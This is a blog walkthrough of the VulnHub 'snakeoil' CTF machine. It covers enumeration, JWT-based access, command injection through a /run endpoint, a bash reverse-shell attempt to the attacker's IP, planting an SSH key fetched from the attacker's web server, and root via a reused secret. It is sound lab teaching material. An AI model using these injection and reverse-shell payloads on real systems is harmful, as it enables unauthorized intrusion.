---
published: true
layout: post
author: mark
date: '2021-10-04 00:00:01 UTC'
tags: ctf vulnhub snakeoil
---
Hello all. We have another day and another vulnerable machine to crack.
Today we are looking at [digitalworld.local: snakeoil](https://www.vulnhub.com/entry/snakeoil_1,738/) (Easy? difficulty).

Also make sure to check out our youtube channel for the VOD if you missed the livestream (and other past streams). :)

## Prep:
- Get your VMs a running (Kali and _the target_)
- Ensure you have burp suite running.
- Ensure you have gobuster and seclists (if you prefer seclists) installed on your Kali machine.

Just a handy hint. Export your targetip like below and then when you copy the commands no editing your ip into it required.

```
export TARGETIP=192.168.1.22
```

## Write up:

And lets kick off, right away we run the NMAP scan to get our initial fact finding and information gathering kicked off.

```
nmap -sC -sV $TARGETIP -oN nmap.log
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-04 11:20 AEDT
Nmap scan report for SNAKEOIL.localdomain (192.168.1.166)
Host is up (0.000078s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 73:a4:8f:94:a2:20:68:50:5a:ae:e1:d3:60:8d:ff:55 (RSA)
|   256 f3:1b:d8:c3:0c:3f:5e:6b:ac:99:52:80:7b:d6:b6:e7 (ECDSA)
|_  256 ea:61:64:b6:3b:d3:84:01:50:d8:1a:ab:38:29:12:e1 (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to SNAKEOIL!
8080/tcp open  http    nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title:  Welcome to Good Tech Inc.'s Snake Oil Project
MAC Address: 00:0C:29:DE:7C:33 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.22 seconds
```

So a couple websites listed on ports 80 and 8080. Also we notice ssh on port 22 which might be how we can get onto the box later.

So lets check out the first website on port 80.

![image1.png]({{site.baseurl}}/Images/vb-snakeoil/IMAGE1.png)

Not much on the site and when we do the standard techinques of looking at the code and running gobuster for directories doesnt return much.

So lets try the site on port 8080.

![image2.png]({{site.baseurl}}/Images/vb-snakeoil/IMAGE2.png)

The useful links post gives us a link to some [flask documentation](https://flask-jwt-extended.readthedocs.io/en/stable/options/): we keep that open for reference in case we need it to craft some requests.

Running gobuster on this site yields more results for us to look at.

```
gobuster dir -u $TARGETIP:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.166:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html,xml
[+] Timeout:                 10s
===============================================================
2021/10/04 11:25:59 Starting gobuster in directory enumeration mode
===============================================================
/1                    (Status: 200) [Size: 2193]
/01                   (Status: 200) [Size: 2193]
/login                (Status: 405) [Size: 64]  
/2                    (Status: 200) [Size: 2356]
/02                   (Status: 200) [Size: 2356]
/04                   (Status: 200) [Size: 2324]
/4                    (Status: 200) [Size: 2324]
/users                (Status: 200) [Size: 140]
/registration         (Status: 200) [Size: 29]  
/test                 (Status: 200) [Size: 17]  
/create               (Status: 200) [Size: 2596]
/001                  (Status: 200) [Size: 2193]
/002                  (Status: 200) [Size: 2356]
/004                  (Status: 200) [Size: 2324]
/0001                 (Status: 200) [Size: 2193]
/secret               (Status: 500) [Size: 37]  
/run                  (Status: 405) [Size: 178]
/0004                 (Status: 200) [Size: 2324]
/0002                 (Status: 200) [Size: 2356]
/000004               (Status: 200) [Size: 2324]
```

So we have an interesting set of results available to us. Lets dive into a few of them.

`/users` is an interesting one... it returns a username and encrypted password. Lets save that for later. We could try targeting the encrypted password but there might be an easier way in.

![image3.png]({{site.baseurl}}/Images/vb-snakeoil/IMAGE3.png)

`/run` returns a method not allowed

![image4.png]({{site.baseurl}}/Images/vb-snakeoil/IMAGE4.png)

running an OPTIONS request we can see that it allows only POST

![image5.png]({{site.baseurl}}/Images/vb-snakeoil/IMAGE5.png)

sending a POST request gives us something potentially useful

![image6.png]({{site.baseurl}}/Images/vb-snakeoil/IMAGE6.png)

Lets set up a python web listener, and try to get it to call us.

```
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And when we send a POST with the url as our KALI listerner, we get presented with a new error:

![image7.png]({{site.baseurl}}/Images/vb-snakeoil/IMAGE7.png)

It needs a secret key so lets try and get a secret key. There was a registration endpoint. Lets go register!

When we call `/registration` it tells us to use a different method as well. So we jump to POST and have an educated guess at a body to go with it.

![image8.png]({{site.baseurl}}/Images/vb-snakeoil/IMAGE8.png)

Success and now we have an access token. We know we need to get a secret key for `/run` (we tried the JWT directly and it didnt work)

Assuming that `/secret` is failing due to lack of authentication (it received a 500 in the gobuster), we need to read the doco page to figure out how we need to send our auth token to the server.

After trying all the auth headers (Bearer etc) we finally get down to the section of the doco that talks about the `access_token_cookie`

Lets add that and try GET on `/secret`.

![image9.png]({{site.baseurl}}/Images/vb-snakeoil/IMAGE9.png)

Success! Lets take this secret key over to our `/run` request and see what happens:

![image10.png]({{site.baseurl}}/Images/vb-snakeoil/IMAGE10.png)

Looks like it is passing our input through to a command on the server side. After trying a few different command chaining techniques none of them seem to work, but leaving the url blank does give us insight into what is being executed:

![image11.png]({{site.baseurl}}/Images/vb-snakeoil/IMAGE11.png)

This looks more like standard output, so lets use this command to chain our commands:

```
--help && whoami
```

![image12.png]({{site.baseurl}}/Images/vb-snakeoil/IMAGE12.png)

The application is running as patrick! Lets try to turn this into a shell.

```
--help && bash -i >& /dev/tcp/192.168.1.162/443 0>&1;
```

![image13.png]({{site.baseurl}}/Images/vb-snakeoil/IMAGE13.png)

Interesting. There are some additional protections in place.. that's annoying. There is a whitelist in place to block keywords, but we have code execution, and we saw ssh on the box earlier.. time to find the key.

```
--help && ls -la /home/patrick/.ssh;
```

There was nothing in the /.ssh directory, but we might be able to put our own public key there.
Lets create a public key.

```
ssh-keygen
vim authorized_keys
```
add our public key to that file and now to get it on the target:

Back in Burp set the body of the request to:
```
{
"url": "192.168.1.162:8000/authorized_keys -o /home/patrick/.ssh/authorized_keys;",
"secret_key": "commandexecutionissecret"
}
```

On our attack machine we can see that the file was downloaded.

```
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.1.166 - - [04/Oct/2021 12:22:21] "GET /authorized_keys HTTP/1.1" 200 -
```

and we can confirm it by re-running our ls.

![image14.png]({{site.baseurl}}/Images/vb-snakeoil/IMAGE14.png)

Now all we need to do is connect with our private key and we we are in!

```
ssh -i thoseguys patrick@$TARGETIP
Linux SNAKEOIL 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
patrick@SNAKEOIL:~$
```

Our standard enumeration shows that patrick has sudo permissions on the shutdown binary, but it asks us for his password:

```
patrick@SNAKEOIL:~$ sudo -l
Matching Defaults entries for patrick on SNAKEOIL:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User patrick may run the following commands on SNAKEOIL:
    (root) NOPASSWD: /sbin/shutdown
    (ALL : ALL) ALL
patrick@SNAKEOIL:~$ sudo /sbin/shutdown -h
[sudo] password for patrick:
```

After a bit more poking around the system we eventually find the password.

```
patrick@SNAKEOIL:~/flask_blog$ cat app.py
import sqlite3
import json

from flask import Flask, render_template, request, url_for, flash, redirect, jsonify, make_response, abort

...

app = Flask(__name__)
api = Api(app)
app.config['SECRET_KEY'] = 'snakeoilisnotgoodforcorporations'
app.config['JWT_COOKIE_SECURE'] = True
app.config['JWT_SECRET_KEY'] = 'NOreasonableDOUBTthisPASSWORDisGOOD'
app.config['JWT_ACCESS_TOKEN_EXPIRES'] = timedelta(minutes=15)
app.config['JWT_REFRESH_TOKEN_EXPIRES'] = timedelta(hours=1)

...

    return jsonify(success=True, message=outs.decode('utf-8'))

# hosting instructions

if __name__  == "__main__":
    app.run(host='0.0.0.0')
```

We try that password and BAM we are root (not groot but kinda cooler?)
```
patrick@SNAKEOIL:~/flask_blog$ sudo su
[sudo] password for patrick:
root@SNAKEOIL:/home/patrick/flask_blog#
```
